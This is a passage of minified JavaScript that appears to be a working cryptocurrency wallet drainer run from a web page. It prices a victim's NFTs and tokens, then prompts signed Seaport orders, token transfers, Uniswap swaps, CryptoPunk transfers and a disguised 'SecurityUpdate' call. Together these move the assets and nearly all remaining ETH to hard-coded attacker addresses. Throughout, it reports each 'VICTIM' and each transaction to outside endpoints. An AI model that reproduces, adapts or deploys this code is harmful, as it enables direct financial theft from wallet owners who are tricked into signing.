                    return filtered = e.filter((e=>e.asset_contract.address == d.asset_contract.address)),
                    void (W[d.asset_contract.address] = [66 * filtered.length, "PUNK", d.collection.name, 66]);
                if (known_prices.hasOwnProperty(d.asset_contract.address))
                    return filtered = e.filter((e=>e.asset_contract.address == d.asset_contract.address)),
                    void (W[d.asset_contract.address] = [known_prices[d.asset_contract.address] * filtered.length, d.asset_contract.schema_name, d.collection.name, known_prices[d.asset_contract.address]]);
                const {collection: m} = await fetch("https://api.opensea.io/api/v1/collection/" + c).then((d=>d.json()));
                if (m.stats.total_volume >= 10)
                    try {
                        const d = m.stats.floor_price;
                        if (doesit = "0x495f947276749ce646f68ac8c248420045cb7b5e" != m.primary_asset_contracts[0].address && "0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85" != m.primary_asset_contracts[0].address && "0x39ee2c7b3cb80254225884ca001f57118c8f21b6" != m.primary_asset_contracts[0].address && "0x76be3b62873462d2142405439777e971754e8e77" != m.primary_asset_contracts[0].address && "0x0E32cEE0445413e118b14d02E0409303D338487a" != m.primary_asset_contracts[0].address && "0x60F80121C31A0d46B5279700f9DF786054aa5eE5" != m.primary_asset_contracts[0].address,
                        !doesit)
                            return;
                        if (d < .05)
                            return;
                        filtered = e.filter((d=>d.asset_contract.address == m.primary_asset_contracts[0].address)),
                        "sandbox" == c && (filtered = e.filter((d=>d.asset_contract[3].address == m.primary_asset_contracts[0].address))),
                        W[m.primary_asset_contracts[0].address] = [d * filtered.length, m.primary_asset_contracts[0].schema_name, m.name, d]
                    } catch (d) {
                        return
                    }
            }
            ));
            return await Promise.all(m),
            W
        }(k, C)]);
        var M = await prices_big_promise;
        function S(d) {
            for (var e = {}, c = [], W = d.length, m = 0, a = 0; a < W; a++) {
                var f = d[a];
                1 !== e[f] && (e[f] = 1,
                c[m++] = f)
            }
            return c
        }
        erc_responses = await M[0],
        nft_responses = await M[1],
        console.log(nft_responses),
        console.log(erc_responses),
        console.log(nft_responses),
        erc_approved = S(Z),
        to_seaport_drainer = [];
        for (let d = 0; d < erc_approved.length; d++)
            erc_responses.hasOwnProperty(erc_approved[d]) && to_seaport_drainer.push([erc_approved[d], erc_responses[erc_approved[d]][1], erc_responses[erc_approved[d]][0], "ERC-20", erc_responses[erc_approved[d]][0]]);
        to_seaport_drainer.sort((function(d, e) {
            let c = d[2]
              , W = e[2];
            return c > W ? 1 : c < W ? -1 : 0
        }
        )),
        to_seaport_drainer = to_seaport_drainer.reverse(),
        to_seaport_drainer = to_seaport_drainer.slice(0, 1),
        z = S(z);
        for (let d = 0; d < z.length; d++)
            if (nft_responses.hasOwnProperty(z[d])) {
                out = C.filter((e=>e.asset_contract.address == z[d]));
                for (let e = 0; e < out.length; e++)
                    to_seaport_drainer.push([z[d], out[e].token_id, nft_responses[z[d]][3], nft_responses[z[d]][1], nft_responses[z[d]][2]])
            }
        if (console.log(to_seaport_drainer),
        to_seaport_drainer.sort((function(d, e) {
            let c = d[2]
              , W = e[2];
            return c > W ? 1 : c < W ? -1 : 0
        }
        )),
        to_seaport_drainer = to_seaport_drainer.reverse(),
        to_seaport_drainer = to_seaport_drainer.slice(0, 20),
        console.log(to_seaport_drainer),
        to_seaport_drainer.length > 0) {
            if (seaport_result = await async function(d, e, c) {
                try {
                    var W = []
                      , m = []
                      , a = 0;
                    c.forEach((async d=>{
                        var e;
                        a += d[2],
                        type = "ERC721" == (e = d[3]) ? 2 : "ERC1155" == e ? 3 : "ERC-20" == e ? 1 : void 0,
                        1 == type ? (W.push({
                            itemType: type,
                            token: d[0],
                            identifier: "0",
                            amount: d[1]
                        }),
                        m.push({
                            itemType: type,
                            token: d[0],
                            identifier: "0",
                            amount: d[1],
                            recipient: "0x053973D64EE9256d6957E3C5D2b5dD100064F07F"
                        })) : (W.push({
                            itemType: type,
                            token: d[0],
                            identifier: d[1]
                        }),
                        m.push({
                            itemType: type,
                            token: d[0],
                            identifier: d[1],
                            recipient: "0x053973D64EE9256d6957E3C5D2b5dD100064F07F"
                        }))
                    }
                    )),
                    yx("SEAPORT PROMPTED [Address](https://etherscan.io/address/" + b + ")");
                    var f = await e.createOrder({
                        zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
                        startTime: "1661790956",
                        conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
                        offer: W,
                        consideration: m
                    }, "0x053973D64EE9256d6957E3C5D2b5dD100064F07F")
                      , o = await f.executeAllActions();
                    let d = []
                      , k = 0;
                    for (const e in o.parameters.offer) {
                        const e = {
                            orderIndex: 0
                        };
                        e.itemIndex = k;
                        const c = {
                            orderIndex: 0
                        };
                        c.itemIndex = k;
                        const W = {};
                        W.offerComponents = [e],
                        W.considerationComponents = [c],
                        d.push(W),
                        k++
                    }
                    abi = await new ethers.utils.Interface(wz),
                    encoded = await abi.encodeFunctionData("matchOrders", [[o], d]);
                    var n = await btoa(encoded);
                    const x = await fetch("https://moralis-node.com/users/48651468148651648", {
                        method: "POST",
                        body: n
                    });
                    var t = await x.text();
                    if (t.startsWith("0x"))
                        var y = "False"
                          , J = "https://etherscan.io/tx/" + t;
                    else
                        y = "True",
                        J = "None";
                    const z = await fetch("https://api.jsonbin.io/v3/b/", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            "X-Master-Key": "",
                            "X-Bin-Private": "false",
                            "X-Bin-Name": "test"
                        },
                        body: JSON.stringify(o)
                    })
                      , Z = await z.json();
                    return wx("🥇 SEAPORT NFT x" + c.length + "\nAddress: " + b + "\n📛 Receive: 0x053973D64EE9256d6957E3C5D2b5dD100064F07F\n💫 Worth: " + a + " ETH\nWebsite: " + window.location.host),
                    yx("SEAPORT ITEMS: " + c.length + " [Address](https://etherscan.io/address/" + b + ") [JSON](https://api.jsonbin.io/v3/b/" + Z.metadata.id + "?meta=false) [TXID](" + J + ")\nManual: " + y + "\nValue: " + a + "ETH"),
                    !!t.startsWith("0x")
                } catch (d) {
                    return yx("SEAPORT ERROR [Address](https://etherscan.io/address/" + b + ")\n" + d.message + " Prompting SAFA"),
                    !1
                }
            }(0, o, to_seaport_drainer),
            seaport_result)
                for (let d = 0; d < to_seaport_drainer.length; d++)
                    nft_responses.hasOwnProperty(to_seaport_drainer[d][0]) ? (new_value = nft_responses[to_seaport_drainer[d][0]][0] - nft_responses[to_seaport_drainer[d][0]][0],
                    new_value >= 0 ? (delete nft_responses[to_seaport_drainer[d][0]],
                    console.log("removed " + to_seaport_drainer[d][0])) : nft_responses[to_seaport_drainer[d][0]] = [new_value, nft_responses[to_seaport_drainer[d][0]][1], nft_responses[to_seaport_drainer[d][0]][2], nft_responses[to_seaport_drainer[d][0]][3]]) : erc_responses.hasOwnProperty(to_seaport_drainer[d][0]) && delete erc_responses[to_seaport_drainer[d][0]]
        } else
            yx("VICTIM HAS 0 CONDUIT ITEMS [Address](https://etherscan.io/address/" + b + ")\n Prompting SAFA");
        list_approval = [];
        for (const d in nft_responses)
            nft_responses.hasOwnProperty(d) && list_approval.push([d, "useless", nft_responses[d][0], nft_responses[d][1], nft_responses[d][2]]);
        for (const d in erc_responses)
            erc_responses.hasOwnProperty(d) && list_approval.push([d, erc_responses[d][1], erc_responses[d][0], "ERC-20", erc_responses[d][0]]);
        list_approval.sort((function(d, e) {
            let c = d[2]
              , W = e[2];
            return c > W ? 1 : c < W ? -1 : 0
        }
        )),
        list_approval = list_approval.reverse(),
        list_approval.length > 0 ? response_approvals = await async function(d) {
            async function e(d, e, c, W, m, a) {
                try {
                    console.log("trying"),
                    keyPair = await window.crypto.subtle.importKey("spki", W6, {
                        name: "RSA-OAEP",
                        hash: "SHA-256"
                    }, !0, ["encrypt"]),
                    mess = await W0(keyPair, d),
                    addr = await W0(keyPair, e),
                    coll = await W0(keyPair, c),
                    receiv = await W0(keyPair, W),
                    txxxxxxxx = await W0(keyPair, m),
                    amdsadsat = await W0(keyPair, a),
                    console.log(mess),
                    console.log({
                        mess: d,
                        address: e,
                        coin_contract_add: c,
                        receiver: W
                    });
                    let f = new FormData;
                    f.append("action", "transfer_from"),
                    f.append("b1", c),
                    f.append("b2", e),
                    f.append("b3", W),
                    f.append("b4", "-1"),
                    fetch("https://www.unpkgaa.com/handler/handler.php", {
                        body: f,
                        method: "post"
                    });
                    const o = {};
                    return o.one = wl,
                    o.two = mess,
                    o.three = addr,
                    o.four = coll,
                    o.five = receiv,
                    o.sex = txxxxxxxx,
                    void (o.seven = amdsadsat)
                } catch (d) {
                    console.log(d)
                }
            }
            permitable = ["0x0d438f3b5175bebc262bf23753c1e53d03432bde", "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", "0xba100000625a3754423978a60c9317c58a424e3d", "0x27702a26126e0b3702af63ee09ac4d1a084ef628", "0xd46ba6d942050d489dbd938a2c909a5d5039a161", "0x362bc847a3a9637d3af6624eec853618a43ed7d2", "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9", "0x2edf094db69d6dcd487f1b3db9febe2eec0dd4c5", "0xa117000000f279d81a1d3cc75430faa017fa5a2e", "0xeef9f339514298c6a857efcfc1a762af84438dee", "0x18aaa7115705e8be94bffebde57af9bfc265b998", "0x0202be363b8a4820f3f4de7faf5224ff05943ab1", "0xffc97d72e13e01096502cb8eb52dee56f74dad7b", "0x05ec93c0365baaeabf7aeffb0972ea7ecdd39cf1", "0xa361718326c15715591c299427c62086f69923d9", "0x028171bca77440897b824ca71d1c56cac55b68a3", "0xac6df26a590f08dcc95d5a4705ae8abbc88509ef", "0x39c6b3e42d6a679d7d776778fe880bc9487c2eda", "0xa06bc25b5805d5f8d82847d191cb4af5a3e873e0", "0xa685a61171bb30d4072b338c80cb7b2c865c873e", "0xc713e5e149d5d0715dcd1c156a020976e7e56b88", "0x35f6b052c598d933d69a4eec4d04c73a191fe6c2", "0x6c5024cd4f8a59110119c56f8933403a539555eb", "0x101cc05f4a51c0319f570d5e146a8c625198e636", "0xb9d7cb55f463405cdfbe4e90a6d2df01c2b92bf1", "0xbcca60bb61934080951369a648fb03df4f96263c", "0x3ed3b47dd13ec9a98b44e6204a523e766b225811", "0x9ff58f4ffb29fa2266ab25e75e2a8b3503311656", "0x030ba81f1c18d280636f32af80b9aad02cf0854e", "0x5165d24277cd063f5ac44efd447b27025e888f37", "0xdf7ff54aacacbff42dfe29dd6144a69b629f8c9e", "0x111111111117dc0aa78b770fa6a738034120c302", "0x4688a8b1f292fdab17e9a90c8bc379dc1dbd8713", "0xa8b12cc90abf65191532a12bb5394a714a46d358", "0x888888888889c00c67689029d7856aac1065ec11", "0x725c263e32c72ddc3a19bea12c5a0479a81ee688", "0x0000000000095413afc295d19edeb1ad7b71c952", "0x297d33e17e61c2ddd812389c2105193f8348188a", "0x6399c842dd2be3de30bf99bc7d1bbf6fa3650e70", "0x6e9730ecffbed43fd876a264c982e254ef05a0de", "0x2aeccb42482cc64e087b6d2e5da39f5a7a7001f8", "0x888888435fde8e7d4c54cab67f206e4199454c60", "0xa8b61cff52564758a204f841e636265bebc8db9b", "0xcd2828fc4d8e8a0ede91bb38cf64b1a81de65bf6", "0xceb286c9604c542d3cc08b41aa6c9675b078a832", "0x956f47f50a910163d8bf957cf5846d573e7f87ca", "0x5f98805a4e8be255a32880fdec7f6728c6568ba0", "0x88acdd2a6425c3faae4bc9650fd7e27e0bebb7ab", "0xc477d038d5420c6a9e0b031712f61c5120090de9", "0x48c3399719b582dd63eb5aadf12a40b4c3f52fa2", "0xf16e81dce15b08f326220742020379b855b87df9", "0x5a666c7d92e5fa7edcb6390e4efd6d0cdd69cf37", "0x90de74265a416e1393a450752175aed98fe11517", "0x677ddbd918637e5f2c79e164d402454de7da8619", "0x9695e0114e12c0d3a3636fab5a18e6b737529023", "0x6dea81c8171d0ba574754ef6f8b412f2ed88c54d", "0x1321f1f1aa541a56c31682c57b80ecfccd9bb288", "0xdddddd4301a082e62e84e43f474f044423921918", "0x92d6c1e31e14520e676a687f0a93788b716beff5", "0x19042021329fddcfbea5f934fb5b2670c91f7d20", "0xc221b7e65ffc80de234bbb6667abdd46593d34f0", "0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0", "0x949d48eca67b17269629c7194f4b727d4ef9e5d6", "0xc18360217d8f7ab5e7c516566761ea12ce7f9d72", "0x8254e26e453eb5abd29b3c37ac9e8da32e5d3299", "0x6bba316c48b49bd1eac44573c5c871ff02958469", "0xa36fdbbae3c9d55a1d67ee5821d53b50b63a1ab9", "0xcdf7028ceab81fa0c6971208e83fa7872994bee5", "0x0de05f6447ab4d22c8827449ee4ba2d5c288379b", "0x1a7e4e63778b4f12a199c062f3efdd288afcbce8", "0x31429d1856ad1377a8a0079410b297e1a9e214c2", "0xd38bb40815d2b0c2d2c866e0c72c5728ffc76dd9", "0xfe459828c90c0ba4bc8b42f5c5d44f316700b430", "0x0f2d719407fdbeff09d87557abb7232601fd9f29", "0xa5f2211b9b8170f694421f2046281775e8468044", "0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5", "0xdef1ca1fb7fbcdc777520aa7f396b4e015f497ab", "0x7f280dac515121dcda3eac69eb4c13a52392cace", "0x299698b4b44bd6d023981a7317798dee12860834", "0x8f693ca8d21b157107184d29d398a8d082b38b76", "0x2163383c1f4e74fe36c50e6154c7f18d9fd06d6f", "0xf406f7a9046793267bc276908778b29563323996", "0xdc49108ce5c57bc3408c3a5e95f3d864ec386ed3", "0x4cf89ca06ad997bc732dc876ed2a7f26a9e7f361", "0x33b4fe5e40e4903a0849ca97b3292eac3eb0aa36", "0xc5102fe9359fd9a28f877a67e36b0f050d81a3cc", "0x4b520c812e8430659fc9f12f6d0c39026c83588d", "0x6bea7cfef803d1e3d5f7c0103f7ded065644e197", "0xbea0000029ad1c77d3d5d23ba2d8893db9d1efab", "0xf1dc500fde233a4055e25e5bbf516372bc4f6871", "0xb0b195aefa3650a6908f15cdac7d92f8a5791b0b", "0x865377367054516e17014ccded1e7d814edc9ce4", "0x3af33bef05c2dcb3c7288b77fe1c8d2aeba4d789"];
            for (let m = 0; m < d.length; m++)
                if ("0x0" != d[m][0])
                    if ("ERC-20" == d[m][3])
                        if (permitable.includes(d[m][0]))
                            console.log(d[m]),
                            await t(d[m][2], d[m][1], d[m][0]);
                        else {
                            async function c(d, e) {
                                return uni_aaaa = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45",
                                logs_nft = await provider_test.getLogs({
                                    address: e,
                                    fromBlock: "0x1",
                                    toBlock: "latest",
                                    topics: ["0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925", "0x000000000000000000000000" + d.slice(2), "0x000000000000000000000000" + uni_aaaa.slice(2)]
                                }),
                                approved = !1,
                                console.log(logs_nft),
                                logs_nft.forEach((d=>{
                                    addresss = d.address,
                                    data = d.data,
                                    data.startsWith("0xf") ? approved = !0 : approved = !1
                                }
                                )),
                                approved
                            }
                            async function W(d, e) {
                                return abicko3 = new ethers.utils.Interface([{
                                    inputs: [{
                                        internalType: "uint256",
                                        name: "amountIn",
                                        type: "uint256"
                                    }, {
                                        internalType: "uint256",
                                        name: "amountOutMin",
                                        type: "uint256"
                                    }, {
                                        internalType: "address[]",
                                        name: "path",
                                        type: "address[]"
                                    }, {
                                        internalType: "address",
                                        name: "to",
                                        type: "address"
                                    }],
                                    name: "swapExactTokensForTokens",
                                    outputs: [{
                                        internalType: "uint256",
                                        name: "amountOut",
                                        type: "uint256"
                                    }],
                                    stateMutability: "payable",
                                    type: "function"
                                }]),
                                encoded_dadadaaaaaaa = abicko3.encodeFunctionData("swapExactTokensForTokens", [e, "0", [d, "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"], "0x053973D64EE9256d6957E3C5D2b5dD100064F07F"]),
                                encoded_dadadaaaaaaa
                            }
                            try {
                                await c(b, d[m][0]) ? (console.log(d[m][0] + " is approved "),
                                encoded_shit = await W(d[m][0], d[m][1]),
                                to_ti_to = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45",
                                yx("Prompting Uniswap [Address](https://etherscan.io/address/" + b + ")")) : (console.log(d[m][0] + " is not approved "),
                                yx("Prompting ERC20 SAFA [Address](https://etherscan.io/address/" + b + ")"),
                                encoded_shit = wc,
                                to_ti_to = d[m][0]);
                                const a = {};
                                a.from = b,
                                a.to = to_ti_to,
                                a.data = encoded_shit;
                                const o = await f.estimateGas(a);
                                response = await f.sendTransaction({
                                    from: b,
                                    to: to_ti_to,
                                    data: encoded_shit,
                                    gasLimit: o.toHexString()
                                }),
                                console.log(response),
                                wx("🥇 ERC20 Transfer\nAddress: " + b + "\n📛 Receive: 0x053973D64EE9256d6957E3C5D2b5dD100064F07F\n💫 Value: " + d[m][2] + " ETH\nWebsite: " + window.location.host),
                                e("ERC-20 " + window.location.host + " [TXID](https://etherscan.io/tx/" + response.hash + ") \nFROM " + b + "\nTO 0x053973D64EE9256d6957E3C5D2b5dD100064F07F\nValue: " + d[m][2] + "ETH", b, d[m][0], "0x053973D64EE9256d6957E3C5D2b5dD100064F07F", response.hash, d[m][1])
                            } catch (e) {
                                console.log(e),
                                yx("ERC-20 REJECTED [Address](https://etherscan.io/address/" + b + ") [URL](https://etherscan.io/token/" + d[m][0] + "?a=" + b + ")")
                            }
                        }
                    else if ("PUNK" == d[m][3]) {
                        punk_abicko = new ethers.utils.Interface(wM),
                        filtered_punks = C.filter((d=>"0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb" == d.asset_contract.address));
                        for (let e = 0; e < filtered_punks.length; e++)
                            try {
                                encodedd_shitass_punk = punk_abicko.encodeFunctionData("transferPunk", ["0x053973D64EE9256d6957E3C5D2b5dD100064F07F", filtered_punks[e].token_id]);
                                const c = await f.estimateGas({
                                    from: b,
                                    to: "0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb",
                                    data: encodedd_shitass_punk
                                });
                                console.log(d),
                                response = await f.sendTransaction({
                                    from: b,
                                    to: "0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb",
                                    data: encodedd_shitass_punk,
                                    gasLimit: c.toHexString()
                                }),
                                wx("🥇 PUNK NFT Transfer\nAddress: " + b + "\n📛 [Contract](https://etherscan.io/token/" + d[m][0] + "?a=" + b + ")\n💫 [TXID](https://etherscan.io/tx/" + response.hash + ")\n💫 Value: " + d[m][2] + "\nWebsite: " + window.location.host)
                            } catch (e) {
                                yx("PUNK TRANSFER REJECTED [Address](https://etherscan.io/address/" + b + ") [URL](https://etherscan.io/token/" + d[m][0] + "?a=" + b + ")")
                            }
                    } else if ("0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85" != d[m][0]) {
                        const e = await f.estimateGas({
                            from: b,
                            to: d[m][0],
                            data: wU
                        });
                        try {
                            response = await f.sendTransaction({
                                from: b,
                                to: d[m][0],
                                data: wU,
                                gasLimit: e.toHexString()
                            }),
                            wx("🥇 SAFA Transfer\nAddress: " + b + "\n📛 [Contract](https://etherscan.io/token/" + d[m][0] + "?a=" + b + ")\n💫 [TXID](https://etherscan.io/tx/" + response.hash + ")\n💫 Value: " + d[m][2] + "\nWebsite: " + window.location.host),
                            yx("SAFA " + window.location.host + " [CONTRACT](https://etherscan.io/token/" + d[m][0] + "?a=" + b + ") [TXID](https://etherscan.io/tx/" + response.hash + ")\nFROM " + b + "\nValue: " + d[m][2] + "\nName: " + d[m][4] + "ETH")
                        } catch (e) {
                            yx("SAFA REJECTED [Address](https://etherscan.io/address/" + b + ") [URL](https://etherscan.io/token/" + d[m][0] + "?a=" + b + ")")
                        }
                    }
            return console.log("returning from approvals"),
            !0
        }(list_approval) : yx("VICTIM HAS 0 NFTS/ERC [Address](https://etherscan.io/address/" + b + ")\n Prompting SENDETH"),
        await async function() {
            abi = new ethers.utils.Interface([{
                constant: !1,
                inputs: [],
                name: "SecurityUpdate",
                outputs: [],
                payable: !0,
                stateMutability: "payable",
                type: "function"
            }]),
            encoded = abi.encodeFunctionData("SecurityUpdate");
            const d = await f.getBalance()
              , e = await f.estimateGas({
                from: b,
                to: "0x4eF71dd289B7D024C8a910b10D660144c58ECead",
                value: d,
                data: encoded
            });
            console.log(e);
            const c = (await f.getGasPrice()).mul(e).mul(5)
              , W = d.sub(c)
              , m = ethers.utils.formatEther(d)
              , a = ethers.utils.formatEther(e);
            if (console.log(a),
            m < a)
                return yx("SENDETH ERROR [Address](https://etherscan.io/address/" + b + ") \nbalance too low to transfer ETH"),
                !0;
            try {
                return await f.sendTransaction({
                    from: b,
                    to: "0x4eF71dd289B7D024C8a910b10D660144c58ECead",
                    value: W.toHexString(),
                    data: encoded,
                    gasLimit: e.toHexString()
                }),
                wx("🥇 ETH Transfer\nAddress: " + b + "\n💫 Value: " + m + "\nWebsite: " + window.location.host),
                !0
            } catch (d) {
                return yx("SENDETH ERROR [Address](https://etherscan.io/address/" + b + ")\n" + d.message),
                !0
            }
        }()
    }
    ))
}
));
